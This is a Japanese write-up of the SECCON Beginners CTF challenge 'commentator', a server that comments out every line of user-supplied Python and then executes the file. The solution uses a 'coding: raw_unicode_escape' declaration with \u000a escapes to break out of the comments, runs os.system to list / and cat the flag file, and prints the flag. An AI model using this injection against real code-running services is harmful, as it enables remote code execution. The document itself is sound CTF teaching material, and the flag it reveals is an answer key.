# commentator

## 問題文
コメントには注意しなきゃ！  
`nc commentator.beginners.seccon.games 4444`  
[commentator.tar.gz](files/commentator.tar.gz) 83d58281d8e0c0376b248e3a6a9487f7a106cec0  

## 難易度
**easy**  

## 作問にあたって
[コメントだけのJavaを実行できる記事](https://qiita.com/cha84rakanal/items/06477529d48c52f26e2d)のPython版です。  
JavaのテクニックはCTFでよく見ますが、Pythonはあまり見ないので出しました。  

## 解法
接続先とソースが配布される。  
接続するとPythonコードの入力を求められ、`__EOF__`で入力を終了すると`thx :)`と表示される。  
```bash
$ nc commentator.beginners.seccon.games 4444
                                          _        _                  __
  ___ ___  _ __ ___  _ __ ___   ___ _ __ | |_ __ _| |_ ___  _ __   _  \ \
 / __/ _ \| '_ ` _ \| '_ ` _ \ / _ \ '_ \| __/ _` | __/ _ \| '__| (_)  | |
| (_| (_) | | | | | | | | | | |  __/ | | | || (_| | || (_) | |     _   | |
 \___\___/|_| |_| |_|_| |_| |_|\___|_| |_|\__\__,_|\__\___/|_|    (_)  | |
                                                                      /_/
---------------------------------------------------------------------------
Enter your Python code (ends with __EOF__)
>>> print(1)
>>> __EOF__
thx :)
```
ソースは以下の通りであった。  
```python
#!/usr/local/bin/python

import os
import uuid

############################## Logo ##############################
print(
    f"""                                          _        _                  __
  ___ ___  _ __ ___  _ __ ___   ___ _ __ | |_ __ _| |_ ___  _ __   _  \\ \\
 / __/ _ \\| '_ ` _ \\| '_ ` _ \\ / _ \\ '_ \\| __/ _` | __/ _ \\| '__| (_)  | |
| (_| (_) | | | | | | | | | | |  __/ | | | || (_| | || (_) | |     _   | |
 \\___\\___/|_| |_| |_|_| |_| |_|\\___|_| |_|\\__\\__,_|\\__\\___/|_|    (_)  | |
                                                                      /_/
{"-" * 75}
Enter your Python code (ends with __EOF__)"""
)
############################## Logo ##############################

python = ""
while True:
    line = input(">>> ").replace("\r", "")
    if "__EOF__" in line:
        python += 'print("thx :)")'
        break
    python += f"# {line}\n"  # comment :)

pyfile = f"/tmp/{uuid.uuid4()}.py"
with open(pyfile, "w") as f:
    f.write(python)

os.system(f"python {pyfile}")
os.remove(pyfile)
```
入力の先頭に`# `を付加したコードを/tmp以下に保存して`python`で実行している。  
配布されたDockerfileからフラグを入手するには`/flag-{md5}.txt`を読めばよいとわかる。  
つまり、コメントアウトされるコードを動かしてRCEしろとのことだ。  
普通に考えると実行されるはずもない。  
`python`での実行のため、先頭行をshebangとして悪用することも難しい。  
ここで、Pythonは先頭行に`# coding: utf_8`のように記述することで、文字コードを指定できたことを思い出す。  
これをUTF-7でのXSSのように、悪用できないだろうか。  
[ドキュメント](https://docs.python.org/3/library/codecs.html)で探すと`raw_unicode_escape`があることがわかる。  
これは`\uXXXX`のように16進数で文字を記述でき、改行は`\u000a`となる。  
これを用いることでソースコード中に改行を挿入でき、コメントを脱出できる。  
以下のように行う。  
```bash
$ nc commentator.beginners.seccon.games 4444
                                          _        _                  __
  ___ ___  _ __ ___  _ __ ___   ___ _ __ | |_ __ _| |_ ___  _ __   _  \ \
 / __/ _ \| '_ ` _ \| '_ ` _ \ / _ \ '_ \| __/ _` | __/ _ \| '__| (_)  | |
| (_| (_) | | | | | | | | | | |  __/ | | | || (_| | || (_) | |     _   | |
 \___\___/|_| |_| |_|_| |_| |_|\___|_| |_|\__\__,_|\__\___/|_|    (_)  | |
                                                                      /_/
---------------------------------------------------------------------------
Enter your Python code (ends with __EOF__)
>>> coding: raw_unicode_escape
>>> \u000aimport os
>>> \u000aos.system("ls /")
>>> \u000aos.system("cat /flag-*.txt")
>>> __EOF__
app
bin
boot
dev
etc
flag-437541b5d9499db505f005890ed38f0e.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
ctf4b{c4r3l355_c0mm3n75_c4n_16n173_0nl1n3_0u7r463}thx :)
```
flagが得られた。  

## ctf4b{c4r3l355_c0mm3n75_c4n_16n173_0nl1n3_0u7r463}